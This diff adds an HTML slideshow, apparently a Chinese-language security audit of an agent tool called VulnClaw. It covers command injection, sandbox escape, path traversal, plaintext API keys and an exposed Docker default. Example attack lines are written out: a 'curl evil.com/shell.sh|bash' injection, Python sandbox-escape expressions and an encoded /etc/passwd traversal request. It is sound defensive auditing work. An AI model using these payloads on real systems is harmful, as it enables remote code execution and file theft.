@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnClaw — 安全隐患可视化</title>
+<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-deep: #030508;
+  --card-bg: rgba(20, 22, 30, 0.65);
+  --card-border: rgba(255, 255, 255, 0.08);
+  --sidebar-bg: rgba(10, 12, 20, 0.75);
+  --text-primary: #f0f0f5;
+  --text-secondary: #8a8fa0;
+  --blue: #0A84FF;
+  --green: #30D158;
+  --yellow: #FFD60A;
+  --purple: #BF5AF2;
+  --red: #FF453A;
+  --orange: #FF9F0A;
+  --cyan: #64D2FF;
+  --highlight-1: #FF453A;
+  --highlight-2: #FF9F0A;
+  --highlight-3: #BF5AF2;
+  --highlight-4: #FFD60A;
+  --highlight-5: #0A84FF;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Inter', 'Noto Sans SC', sans-serif;
+  background: var(--bg-deep);
+  color: var(--text-primary);
+  overflow: hidden;
+  height: 100vh;
+  display: flex;
+}
+
+/* ── Sidebar ─────────────────────────────────────────── */
+.sidebar {
+  width: 340px;
+  min-width: 340px;
+  height: 100vh;
+  background: var(--sidebar-bg);
+  backdrop-filter: blur(40px) saturate(160%);
+  -webkit-backdrop-filter: blur(40px) saturate(160%);
+  border-right: 1px solid var(--card-border);
+  display: flex;
+  flex-direction: column;
+  padding: 48px 32px 32px;
+  z-index: 10;
+  transition: opacity 0.3s ease;
+}
+
+.sidebar-header { margin-bottom: 36px; }
+
+.sidebar-header .shield-icon {
+  font-size: 28px;
+  color: var(--red);
+  margin-bottom: 12px;
+}
+
+.sidebar-header h1 {
+  font-size: 22px;
+  font-weight: 700;
+  letter-spacing: -0.3px;
+  margin-bottom: 6px;
+}
+
+.sidebar-header .subtitle {
+  font-size: 13px;
+  color: var(--text-secondary);
+  font-weight: 400;
+}
+
+/* card indicator */
+.card-indicator {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  color: var(--text-secondary);
+  margin-bottom: 8px;
+  letter-spacing: 0.5px;
+}
+
+/* severity badge */
+.severity {
+  display: inline-block;
+  padding: 3px 10px;
+  border-radius: 20px;
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  margin-bottom: 16px;
+}
+
+.severity.critical { background: rgba(255, 69, 58, 0.18); color: var(--red); }
+.severity.high     { background: rgba(255, 159, 10, 0.18); color: var(--orange); }
+.severity.medium   { background: rgba(255, 214, 10, 0.18); color: var(--yellow); }
+
+/* narration */
+.narration {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+
+.narration h2 {
+  font-size: 28px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  line-height: 1.2;
+  transition: all 0.35s ease;
+}
+
+.narration .code-loc {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--text-secondary);
+  opacity: 0.7;
+}
+
+.narration .desc {
+  font-size: 15px;
+  line-height: 1.7;
+  color: #c0c5d0;
+  transition: all 0.35s ease;
+}
+
+.narration .desc .highlight-phrase {
+  background: linear-gradient(120deg, var(--highlight-color, var(--yellow)) 0%, var(--highlight-color, var(--yellow)) 100%);
+  background-repeat: no-repeat;
+  background-size: 0% 0.25em;
+  background-position: 0 88%;
+  transition: background-size 0.6s cubic-bezier(0.25, 0.8, 0.25, 1);
+  padding: 0 2px;
+}
+
+.narration .desc .highlight-phrase.active {
+  background-size: 100% 0.25em;
+}
+
+/* key points */
+.key-points {
+  margin-top: auto;
+  padding: 20px;
+  background: rgba(255, 255, 255, 0.03);
+  border-radius: 14px;
+  border: 1px solid rgba(255, 255, 255, 0.06);
+}
+
+.key-points h4 {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1.2px;
+  color: var(--text-secondary);
+  margin-bottom: 10px;
+}
+
+.key-points ul {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.key-points li {
+  font-size: 13px;
+  color: #b0b5c0;
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  line-height: 1.5;
+  transition: all 0.35s ease;
+}
+
+.key-points li .bullet {
+  min-width: 16px;
+  color: var(--highlight-color, var(--yellow));
+  font-weight: 700;
+  margin-top: 1px;
+}
+
+/* evidence tag */
+.evidence-tag {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text-secondary);
+  margin-top: 12px;
+  opacity: 0.6;
+  transition: all 0.35s ease;
+}
+
+.evidence-tag i {
+  font-size: 10px;
+}
+
+/* ── Main Stage ─────────────────────────────────────── */
+.main-stage {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+
+.main-stage::before {
+  content: '';
+  position: absolute;
+  top: -40%;
+  left: -20%;
+  width: 80%;
+  height: 100%;
+  background: radial-gradient(ellipse at center, rgba(10,132,255,0.06) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.swiper {
+  width: 100%;
+  padding: 60px 0;
+}
+
+.swiper-slide {
+  background: transparent;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
+}
+
+/* cards */
+.card {
+  width: 360px;
+  min-height: 480px;
+  background: var(--card-bg);
+  backdrop-filter: blur(30px) saturate(150%);
+  -webkit-backdrop-filter: blur(30px) saturate(150%);
+  border: 1px solid var(--card-border);
+  border-radius: 22px;
+  padding: 36px 30px;
+  display: flex;
+  flex-direction: column;
+  gap: 18px;
+  cursor: pointer;
+  transition: all 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
+  position: relative;
+  overflow: hidden;
+}
+
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+}
+
+.card:hover {
+  border-color: rgba(255, 255, 255, 0.15);
+}
+
+.swiper-slide-active .card {
+  box-shadow: 0 0 60px rgba(10, 132, 255, 0.08), 0 0 120px rgba(10, 132, 255, 0.03);
+  border-color: rgba(255, 255, 255, 0.12);
+}
+
+/* card icon */
+.card-icon {
+  width: 52px;
+  height: 52px;
+  border-radius: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+}
+
+.card-icon i { color: var(--icon-color); }
+
+/* card number */
+.card-number {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--text-secondary);
+  letter-spacing: 1.5px;
+}
+
+/* card title */
+.card-title {
+  font-size: 22px;
+  font-weight: 700;
+  letter-spacing: -0.3px;
+}
+
+/* card code snippet */
+.card-code {
+  background: rgba(0, 0, 0, 0.4);
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  border-radius: 10px;
+  padding: 14px 16px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  line-height: 1.7;
+  color: #d0d4e0;
+  overflow-x: auto;
+  white-space: pre;
+  position: relative;
+}
+
+.card-code .keyword { color: #BF5AF2; }
+.card-code .string  { color: #30D158; }
+.card-code .comment { color: #6a6f80; }
+.card-code .danger   { color: #FF453A; }
+.card-code .warn     { color: #FF9F0A; }
+.card-code .func     { color: #64D2FF; }
+
+/* code highlight bar */
+.code-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  background: linear-gradient(90deg, rgba(255,69,58,0.12), transparent);
+  border-left: 3px solid var(--highlight-color, var(--red));
+}
+
+/* tag */
+.card-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.6px;
+  padding: 3px 8px;
+  border-radius: 6px;
+  background: rgba(255, 69, 58, 0.1);
+  color: var(--red);
+}
+
+/* glowing border on active */
+.swiper-slide-active .card {
+  box-shadow: 0 0 40px rgba(10,132,255,0.06), 0 0 80px rgba(10,132,255,0.03), inset 0 0 0 1px rgba(255,255,255,0.04);
+}
+
+/* dim inactive */
+.swiper-slide:not(.swiper-slide-active) .card {
+  filter: brightness(0.55) blur(1px);
+  transform: scale(0.92);
+}
+
+/* ── Nav hints ─────────────────────────────────────── */
+.nav-hints {
+  position: absolute;
+  bottom: 36px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 20px;
+  font-size: 12px;
+  color: var(--text-secondary);
+  opacity: 0.5;
+  z-index: 10;
+}
+
+.nav-hints span {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.nav-hints kbd {
+  background: rgba(255,255,255,0.08);
+  border: 1px solid rgba(255,255,255,0.12);
+  border-radius: 5px;
+  padding: 2px 7px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text-secondary);
+}
+
+/* ── Animations ────────────────────────────────────── */
+@keyframes fadeInUp {
+  from { opacity: 0; transform: translateY(12px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes pulse-glow {
+  0%, 100% { box-shadow: 0 0 20px rgba(10,132,255,0.05); }
+  50%      { box-shadow: 0 0 40px rgba(10,132,255,0.12); }
+}
+
+.animate-in {
+  animation: fadeInUp 0.4s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+  .sidebar { width: 260px; min-width: 260px; padding: 32px 20px 24px; }
+  .card { width: 280px; min-height: 400px; padding: 28px 22px; }
+}
+</style>
+</head>
+<body>
+
+<!-- ═══════════════ Sidebar ═══════════════ -->
+<aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="shield-icon"><i class="fa-solid fa-shield-halved"></i></div>
+    <h1>VulnClaw</h1>
+    <div class="subtitle">安全隐患审计报告</div>
+  </div>
+
+  <div class="narration" id="narration">
+    <div class="card-indicator" id="cardIndicator">01 / 05</div>
+    <span class="severity critical" id="severityBadge">严重</span>
+    <h2 id="cardTitle">命令注入 — shell=True</h2>
+    <div class="code-loc" id="codeLoc">vulnclaw/agent/tools.py:358</div>
+    <p class="desc" id="cardDesc">
+      <span class="highlight-phrase active" style="--highlight-color: var(--highlight-1);">shell_command</span> 工具在 Linux 上使用 <span class="highlight-phrase active" style="--highlight-color: var(--highlight-1);">shell=True</span> 执行命令，攻击者可通过 shell 元字符注入任意命令，完全绕过约束策略。
+    </p>
+
+    <div class="key-points" id="keyPoints">
+      <h4>关键要点</h4>
+      <ul>
+        <li><span class="bullet" style="color: var(--highlight-1);">▸</span>Linux 默认 shell=True，命令经过 /bin/sh 解析</li>
+        <li><span class="bullet" style="color: var(--highlight-1);">▸</span>分号、管道、反引号均可链式注入</li>
+        <li><span class="bullet" style="color: var(--highlight-1);">▸</span>URL scope 正则检测仅覆盖命令行中的 http(s) URL</li>
+      </ul>
+    </div>
+
+    <div class="evidence-tag" id="evidenceTag">
+      <i class="fa-solid fa-file-code"></i> builtin_tools.py L358 · subprocess.run(argv, shell=True)
+    </div>
+  </div>
+</aside>
+
+<!-- ═══════════════ Main Stage ═══════════════ -->
+<div class="main-stage">
+  <div class="swiper" id="swiper">
+    <div class="swiper-wrapper">
+
+      <!-- Card 01: shell=True -->
+      <div class="swiper-slide" data-index="0">
+        <div class="card" onclick="swiper.slideTo(0)">
+          <div class="card-number">#01</div>
+          <div class="card-icon" style="background: rgba(255,69,58,0.1);"><i class="fa-solid fa-terminal" style="color: var(--red);"></i></div>
+          <div class="card-title">命令注入</div>
+          <span class="card-tag" style="background: rgba(255,69,58,0.1); color: var(--red);">shell=True</span>
+          <div class="card-code">
+<span class="comment"># Linux: use_shell = os.name != "nt" → True</span>
+<span class="keyword">use_shell</span> = <span class="keyword">os.name</span> != <span class="string">"nt"</span>
+
+<span class="keyword">result</span> = <span class="func">subprocess.run</span>(
+    argv,
+    cwd=<span class="keyword">str</span>(workdir),
+    <span class="danger">shell=use_shell,</span>        <span class="comment">← 危险</span>
+    capture_output=<span class="keyword">True</span>,
+    timeout=timeout_ms / <span class="warn">1000</span>,
+)
+<span class="comment"># 攻击: ls; curl evil.com/shell.sh|bash</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 02: AST sandbox bypass -->
+      <div class="swiper-slide" data-index="1">
+        <div class="card" onclick="swiper.slideTo(1)">
+          <div class="card-number">#02</div>
+          <div class="card-icon" style="background: rgba(255,159,10,0.1);"><i class="fa-solid fa-cube" style="color: var(--orange);"></i></div>
+          <div class="card-title">沙箱绕过</div>
+          <span class="card-tag" style="background: rgba(255,159,10,0.1); color: var(--orange);">AST 检测局限</span>
+          <div class="card-code">
+<span class="comment"># Safe Mode 正则盲区:</span>
+<span class="comment"># open / socket / urllib / requests 被拦截</span>
+<span class="comment"># 但 AST 检测未覆盖:</span>
+
+<span class="danger">().__class__.__bases__[0].__subclasses__()</span>
+<span class="danger">getattr(().__class__, '__subclasses__')</span>
+
+<span class="comment"># AST 只检查显式 getattr(__builtins__,...)</span>
+<span class="comment"># 间接访问 __builtins__ 可绕过:</span>
+<span class="warn">getattr(().__class__.__init__,</span>
+<span class="warn">       '__globals__')['__builtins__']</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 03: Path traversal -->
+      <div class="swiper-slide" data-index="2">
+        <div class="card" onclick="swiper.slideTo(2)">
+          <div class="card-number">#03</div>
+          <div class="card-icon" style="background: rgba(191,90,242,0.1);"><i class="fa-solid fa-route" style="color: var(--purple);"></i></div>
+          <div class="card-title">路径穿越</div>
+          <span class="card-tag" style="background: rgba(191,90,242,0.1); color: var(--purple);">catch-all 路由</span>
+          <div class="card-code">
+<span class="comment"># app.py L251: catch-all 路由</span>
+<span class="keyword">@app</span>.<span class="func">get</span>(<span class="string">"/{full_path:path}"</span>)
+<span class="keyword">async</span> <span class="keyword">def</span> <span class="func">frontend_routes</span>(full_path):
+
+    <span class="keyword">if</span> full_path.startswith(<span class="string">"api/"</span>):
+        <span class="keyword">raise</span> HTTPException(<span class="warn">404</span>)
+
+    <span class="danger">return FileResponse(</span>
+    <span class="danger">    resolve_web_asset(full_path))</span>
+
+<span class="comment"># 攻击: GET /..%2F..%2F..%2Fetc%2Fpasswd</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 04: Plaintext API Key -->
+      <div class="swiper-slide" data-index="3">
+        <div class="card" onclick="swiper.slideTo(3)">
+          <div class="card-number">#04</div>
+          <div class="card-icon" style="background: rgba(255,214,10,0.1);"><i class="fa-solid fa-key" style="color: var(--yellow);"></i></div>
+          <div class="card-title">凭证明文</div>
+          <span class="card-tag" style="background: rgba(255,214,10,0.1); color: var(--yellow);">config.yaml</span>
+          <div class="card-code">
+<span class="comment"># settings.py L102: save_config</span>
+<span class="keyword">def</span> <span class="func">save_config</span>(config):
+    raw = config.model_dump(mode=<span class="string">"json"</span>)
+    _strip_defaults(raw)
+
+    <span class="keyword">with</span> <span class="func">open</span>(<span class="danger">CONFIG_FILE</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:
+        <span class="danger">yaml.dump(raw, f)</span>  <span class="comment">← 明文</span>
+
+<span class="comment"># ~/.vulnclaw/config.yaml:</span>
+<span class="danger">api_key: sk-xxxxxxxxxxxxxxx</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 05: Dockerfile default exposure -->
+      <div class="swiper-slide" data-index="4">
+        <div class="card" onclick="swiper.slideTo(4)">
+          <div class="card-number">#05</div>
+          <div class="card-icon" style="background: rgba(10,132,255,0.1);"><i class="fa-solid fa-docker" style="color: var(--blue);"></i></div>
+          <div class="card-title">默认开放</div>
+          <span class="card-tag" style="background: rgba(10,132,255,0.1); color: var(--blue);">Dockerfile 入口</span>
+          <div class="card-code">
+<span class="comment"># Dockerfile 默认 CMD:</span>
+<span class="keyword">CMD</span> [<span class="string">"vulnclaw"</span>, <span class="string">"web"</span>,
+     <span class="danger">"--host"</span>, <span class="danger">"0.0.0.0"</span>,
+     <span class="string">"--port"</span>, <span class="string">"7788"</span>,
+     <span class="warn">"--allow-remote"</span>]
+
+<span class="comment"># 容器启动即暴露 7788 端口</span>
+<span class="comment"># 无需认证即可访问 Web UI</span>
+<span class="comment"># 攻击者可远程操控渗透任务</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="nav-hints">
+    <span><kbd>←</kbd> <kbd>→</kbd> 切换</span>
+    <span><i class="fa-solid fa-computer-mouse"></i> 滚轮翻页</span>
+    <span><i class="fa-solid fa-hand-pointer"></i> 点击卡片</span>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+<script>
+// ── Data ─────────────────────────────────────────────
+const vulnerabilities = [
+  {
+    severity: '严重', severityClass: 'critical',
+    title: '命令注入 — shell=True',
+    codeLoc: 'vulnclaw/agent/tools.py:358',
+    desc: '<span class="highlight-phrase" style="--highlight-color: var(--highlight-1);">shell_command</span> 工具在 Linux 上使用 <span class="highlight-phrase active" style="--highlight-color: var(--highlight-1);">shell=True</span> 执行命令。攻击者可通过分号、管道、反引号等 shell 元字符注入任意系统命令，完全绕过约束策略。',
+    points: [
+      'Linux 默认 shell=True，命令经过 /bin/sh 解析',
+      '分号、管道、反引号均可链式注入',
+      'URL scope 正则检测仅覆盖命令行中的 http(s) URL'
+    ],
+    evidence: 'builtin_tools.py L358 · subprocess.run(argv, shell=True)',
+    highlightColor: 'var(--highlight-1)'
+  },
+  {
+    severity: '高危', severityClass: 'high',
+    title: '沙箱绕过 — AST 检测局限',
+    codeLoc: 'vulnclaw/agent/tools.py:195-221',
+    desc: 'python_execute 的 <span class="highlight-phrase active" style="--highlight-color: var(--highlight-2);">Safe 模式</span> 通过正则拦截 open / socket / urllib 等。但 AST 检测仅覆盖显式 <span class="highlight-phrase active" style="--highlight-color: var(--highlight-2);">getattr(__builtins__, ...)</span>，未覆盖通过 <code>().__class__.__bases__[0].__subclasses__()</code> 间接访问。',
+    points: [
+      '正则拦截 open/socket/urllib/requests/import os 等',
+      'AST 只检查 getattr(__builtins__, name) 一种模式',
+      '通过 __class__.__bases__.__subclasses__ 链绕过'
+    ],
+    evidence: 'builtin_tools.py L106-189 · _ast_check_sandbox_bypass 覆盖不足',
+    highlightColor: 'var(--highlight-2)'
+  },
+  {
+    severity: '高危', severityClass: 'high',
+    title: '路径穿越 — catch-all 路由',
+    codeLoc: 'vulnclaw/web/app.py:251-255',
+    desc: 'Web UI 使用 <span class="highlight-phrase active" style="--highlight-color: var(--highlight-3);">/{full_path:path}</span> 作为 catch-all 路由。resolve_web_asset() 虽有路径遍历保护，但攻击者仍可通过 URL 编码绕过，读取容器内任意文件。',
+    points: [
+      'FastAPI path 类型自动解码 ../ 序列',
+      'resolve_web_asset 保护可被 URL 二次编码绕过',
+      '可读取 ~/.vulnclaw/config.yaml 等敏感文件'
+    ],
+    evidence: 'app.py L251 · @app.get("/{full_path:path}") 无白名单验证',
+    highlightColor: 'var(--highlight-3)'
+  },
+  {
+    severity: '中危', severityClass: 'medium',
+    title: '凭证明文 — config.yaml',
+    codeLoc: 'vulnclaw/config/settings.py:98-106',
+    desc: '<span class="highlight-phrase active" style="--highlight-color: var(--highlight-4);">save_config()</span> 将完整配置通过 yaml.dump 写入 <code>~/.vulnclaw/config.yaml</code>。API Key 以明文形式持久化存储，任何能读取该文件的进程或用户即可获取所有 LLM 提供商密钥。',
+    points: [
+      'config.yaml 以 644 权限写入，同主机用户可读',
+      '无加密、无 keyring、无环境变量保护',
+      '一旦容器被攻破，所有 API Key 全部泄露'
+    ],
+    evidence: 'settings.py L102 · yaml.dump(raw, f) 明文写入',
+    highlightColor: 'var(--highlight-4)'
+  },
+  {
+    severity: '高危', severityClass: 'high',
+    title: '默认开放 — Dockerfile 入口',
+    codeLoc: 'Dockerfile (CMD 行)',
+    desc: 'Dockerfile 默认 <span class="highlight-phrase active" style="--highlight-color: var(--highlight-5);">CMD</span> 使用 <code>--host 0.0.0.0 --allow-remote</code>，容器启动即绑定所有网络接口。若用户未额外配置防火墙或反向代理认证，Web UI 直接暴露于公网。',
+    points: [
+      '0.0.0.0 绑定所有网络接口，绕过容器网络隔离',
+      '--allow-remote 禁用来源检查',
+      '建议默认使用 127.0.0.1，需要时显式配置'
+    ],
+    evidence: 'Dockerfile · CMD ["vulnclaw","web","--host","0.0.0.0","--allow-remote"]',
+    highlightColor: 'var(--highlight-5)'
+  }
+];
+
+// ── Swiper ───────────────────────────────────────────
+const swiper = new Swiper('#swiper', {
+  effect: 'coverflow',
+  grabCursor: true,
+  centeredSlides: true,
+  slidesPerView: 'auto',
+  loop: false,
+  speed: 500,
+  coverflowEffect: {
+    rotate: 0,
+    stretch: 0,
+    depth: 200,
+    modifier: 1.5,
+    slideShadows: false,
+    scale: 0.75,
+  },
+  mousewheel: {
+    thresholdDelta: 50,
+    sensitivity: 1,
+  },
+  keyboard: {
+    enabled: true,
+    onlyInViewport: true,
+  },
+  on: {
+    slideChange: updateSidebar,
+    init: function() { updateSidebar(this); }
+  }
+});
+
+// ── Sidebar Updater ──────────────────────────────────
+function updateSidebar(swiperInstance) {
+  const idx = swiperInstance.activeIndex;
+  const v = vulnerabilities[idx] || vulnerabilities[0];
+
+  // Reset highlight animations
+  document.querySelectorAll('.highlight-phrase').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('#narration h2, #narration .desc, .key-points li').forEach(el => {
+    el.classList.remove('animate-in');
+  });
+
+  // Update content
+  document.getElementById('cardIndicator').textContent =
+    String(idx + 1).padStart(2, '0') + ' / ' + String(vulnerabilities.length).padStart(2, '0');
+
+  const badge = document.getElementById('severityBadge');
+  badge.textContent = v.severity;
+  badge.className = 'severity ' + v.severityClass;
+
+  document.getElementById('cardTitle').textContent = v.title;
+  document.getElementById('codeLoc').textContent = v.codeLoc;
+  document.getElementById('cardDesc').innerHTML = v.desc;
+  document.getElementById('evidenceTag').innerHTML =
+    '<i class="fa-solid fa-file-code"></i> ' + v.evidence;
+
+  // Update key points
+  const pointsList = document.querySelector('#keyPoints ul');
+  pointsList.innerHTML = v.points.map(p =>
+    '<li><span class="bullet" style="color: ' + v.highlightColor + ';">▸</span>' + p + '</li>'
+  ).join('');
+
+  // Trigger highlight animation
+  setTimeout(() => {
+    document.querySelectorAll('#cardDesc .highlight-phrase').forEach(el => el.classList.add('active'));
+  }, 100);
+
+  // Fade in animation
+  setTimeout(() => {
+    document.getElementById('cardTitle').classList.add('animate-in');
+    document.getElementById('cardDesc').classList.add('animate-in');
+    document.querySelectorAll('.key-points li').forEach(el => el.classList.add('animate-in'));
+  }, 50);
+}
+
+// ── Click on card to navigate ────────────────────────
+document.querySelectorAll('.swiper-slide').forEach((slide, i) => {
+  slide.querySelector('.card').addEventListener('click', () => {
+    if (swiper.activeIndex !== i) swiper.slideTo(i);
+  });
+});
+</script>
+</body>
+</html>
